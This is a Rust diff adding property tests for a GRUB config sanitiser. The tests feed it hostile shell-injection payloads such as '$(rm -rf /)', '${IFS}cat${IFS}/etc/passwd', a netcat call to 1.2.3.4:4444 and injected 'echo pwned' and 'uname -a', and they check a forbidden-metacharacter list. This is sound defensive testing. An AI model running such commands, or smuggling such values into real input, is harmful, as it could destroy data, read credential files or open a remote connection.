@@ -427,6 +427,158 @@ mod tests {
         assert_eq!(sanitize("Ubuntu 24.04 LTS"), "Ubuntu 24.04 LTS");
     }
 
+    /// Property test: for *every* input string we can construct
+    /// out of the printable + control byte range, the sanitiser
+    /// output must contain none of the FORBIDDEN chars and no C0
+    /// control byte. Also asserts idempotence —
+    /// `sanitize(sanitize(s)) == sanitize(s)`. If either invariant
+    /// breaks, an attacker-controlled field could carry a metachar
+    /// into the rendered grub.cfg.
+    #[test]
+    fn sanitize_invariants_across_byte_range() {
+        // The exact list the production sanitiser uses. Kept inline
+        // (not imported) so the test fails loudly if it drifts from
+        // the implementation.
+        const FORBIDDEN: &[char] = &[
+            '"', '\\', '$', '`', ';', '{', '}', '\n', '\r', '\t', '=', '(', ')', '[', ']', '*',
+            '?', '<', '>', '&', '|', '#', '!',
+        ];
+
+        // Every Latin-1 byte exercised standalone.
+        for b in 0u8..=127 {
+            let s = (b as char).to_string();
+            let out = sanitize(&s);
+            for bad in FORBIDDEN {
+                assert!(
+                    !out.contains(*bad),
+                    "{bad:?} survived from byte {b:#x}: {out:?}"
+                );
+            }
+            assert!(
+                !out.chars().any(|c| (c as u32) < 0x20),
+                "control byte survived from {b:#x}: {out:?}",
+            );
+            // Idempotence.
+            assert_eq!(sanitize(&out), out, "non-idempotent for byte {b:#x}");
+        }
+
+        // Pairwise combos — every forbidden char followed by every
+        // other char must still be stripped cleanly.
+        for a in FORBIDDEN {
+            for b in 0u8..=127 {
+                let s = format!("safe{}{}", *a, b as char);
+                let out = sanitize(&s);
+                for bad in FORBIDDEN {
+                    assert!(!out.contains(*bad), "{bad:?} survived in {s:?} -> {out:?}");
+                }
+            }
+        }
+
+        // High-entropy hostile payloads from CVE databases and
+        // common shell-injection corpora.
+        let hostile = [
+            "$(rm -rf /)",
+            "`evil`",
+            "; reboot",
+            "${IFS}cat${IFS}/etc/passwd",
+            "\\${PATH}\\${HOME}",
+            "<script>alert(1)</script>",
+            "%00%0a; nc 1.2.3.4 4444",
+            "\u{0000}\u{0001}\u{007f}\u{0009}",
+            "\n\r\n",
+        ];
+        for s in hostile {
+            let out = sanitize(s);
+            for bad in FORBIDDEN {
+                assert!(
+                    !out.contains(*bad),
+                    "{bad:?} survived from {s:?} -> {out:?}"
+                );
+            }
+            assert!(
+                !out.chars().any(|c| (c as u32) < 0x20),
+                "control byte survived from {s:?} -> {out:?}",
+            );
+            assert_eq!(sanitize(&out), out, "non-idempotent for {s:?}");
+        }
+    }
+
+    /// Whole-renderer property: regardless of which BootConfig
+    /// fields carry hostile input, no user-controlled substring
+    /// emits a metachar that could escape its position in the
+    /// rendered grub.cfg. We assert this on the chars that
+    /// *never* appear in legitimate renderer-emitted GRUB syntax:
+    /// backtick, backslash, CR, LF, dollar-inside-quoted-label.
+    /// `;` is excluded because it's part of `if [ … ]; then`;
+    /// `"` is excluded because the renderer emits it as the
+    /// menuentry quote.
+    #[test]
+    fn render_never_emits_metachars_in_user_controlled_positions() {
+        let hostile_field = "safe\";\necho pwned\\$(ls)`uname -a`{x}";
+        let mut e = entry(hostile_field, hostile_field);
+        e.params = hostile_field.to_string();
+        e.initrd = hostile_field.to_string();
+        e.kargs = hostile_field.to_string();
+        e.class = hostile_field.to_string();
+        e.tip = hostile_field.to_string();
+        e.persistence_backend = hostile_field.to_string();
+        e.conf_replace_path = hostile_field.to_string();
+        e.autoinstall = AutoinstallConfig {
+            kind: AutoinstallKind::Kickstart,
+            path: hostile_field.to_string(),
+        };
+        let config = BootConfig {
+            default_entry: Some(hostile_field.to_string()),
+            entries: vec![e],
+            grub_superuser: hostile_field.to_string(),
+            grub_password_pbkdf2: hostile_field.to_string(), // invalid hash → rejected
+            tree_view: true,
+            enable_disk_browser: true,
+        };
+
+        let out = render_grub_cfg(&config, hostile_field);
+
+        // Chars that the renderer NEVER emits legitimately. Any
+        // occurrence here means a user-controlled metachar slipped
+        // through the sanitiser.
+        for bad in ['`', '\\', '\r'] {
+            assert!(!out.contains(bad), "metachar {bad:?} survived: {out}");
+        }
+
+        // The double quote ("), dollar ($), and semicolon (;) are
+        // emitted by the renderer in legitimate positions
+        // (quoted title, `($root)`, `if [ … ]; then`), so we can't
+        // blanket-ban them. Instead, assert specifically that the
+        // *menuentry "<TITLE>"* line — entirely user-controlled —
+        // has at most two quotes (the legitimate enclosing pair).
+        for line in out.lines() {
+            if line.starts_with("menuentry \"")
+                || line.starts_with("  menuentry \"")
+                || line.starts_with("submenu \"")
+            {
+                let quote_count = line.matches('"').count();
+                assert!(
+                    quote_count == 2 || (quote_count == 4 && line.contains("--class")),
+                    "extra quotes in {line:?}",
+                );
+                // No `;` in the quoted label region — the `;` would
+                // have to come before the closing quote.
+                let first_quote = line.find('"').unwrap();
+                let after_first = &line[first_quote + 1..];
+                let close_quote = after_first.find('"').unwrap();
+                let label = &after_first[..close_quote];
+                assert!(
+                    !label.contains(';'),
+                    "semicolon survived in quoted label {label:?}: {line}",
+                );
+                assert!(
+                    !label.contains('\n'),
+                    "newline survived in quoted label {label:?}: {line}",
+                );
+            }
+        }
+    }
+
     #[test]
     fn sanitize_blocks_grub_command_injection() {
         // Realistic attacker payload that previously could break out:
